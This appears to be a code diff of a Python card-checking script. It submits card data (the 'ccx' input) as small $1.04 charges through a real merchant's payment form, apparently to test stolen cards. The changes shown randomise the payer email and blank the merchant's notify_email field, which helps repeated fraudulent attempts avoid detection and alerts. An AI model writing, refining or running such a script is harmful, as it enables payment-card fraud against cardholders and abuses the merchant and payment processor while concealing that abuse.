@@ -15,6 +15,9 @@ def Tele(ccx):
 	if "20" in yy:
 		yy = yy.split("20")[1]
 	r = requests.session()
+	
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
 
 	headers = {
 	    'authority': 'acmetrustnevis.com',
@@ -60,7 +63,7 @@ def Tele(ccx):
 	    'name': 'Rodam User',
 	    'tel': '4303000850',
 	    'AMT': '1.04',
-	    'client-email': 'rodamuser08@gmail.com',
+	    'client-email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
 	    'INVOICE': '1',
 	    'payment_for': 'Foundation Registration',
 	    'MERCHKEY': f'{MERCHKEY}',
@@ -69,7 +72,7 @@ def Tele(ccx):
 	    'TRANID': f'{TRANID}',
 	    'URLAPPROVED': 'https://www.acmetrustnevis.com/success?err=#EM#&rc=#RC#&fc=#FC#',
 	    'URLOTHER': 'https://www.acmetrustnevis.com/other?err=#EM#&rc=#RC#&fc=#FC#',
-	    'notify_email': 'jc.boncamper@gmail.com',
+	    'notify_email': '',
 	    'action': 'four_csonline_submit_form',
 	}
 	
@@ -100,7 +103,7 @@ def Tele(ccx):
 	    'name': 'Rodam User',
 	    'tel': '4303000850',
 	    'AMT': '1.04',
-	    'client-email': 'rodamuser08@gmail.com',
+	    'client-email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
 	    'INVOICE': '1',
 	    'payment_for': 'Foundation Registration',
 	    'MERCHKEY': f'{MERCHKEY}',
@@ -109,7 +112,7 @@ def Tele(ccx):
 	    'TRANID': f'{TRANID}',
 	    'URLAPPROVED': 'https://www.acmetrustnevis.com/success?err=#EM#&rc=#RC#&fc=#FC#',
 	    'URLOTHER': 'https://www.acmetrustnevis.com/other?err=#EM#&rc=#RC#&fc=#FC#',
-	    'notify_email': 'jc.boncamper@gmail.com',
+	    'notify_email': '',
 	}
 	
 	response = requests.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
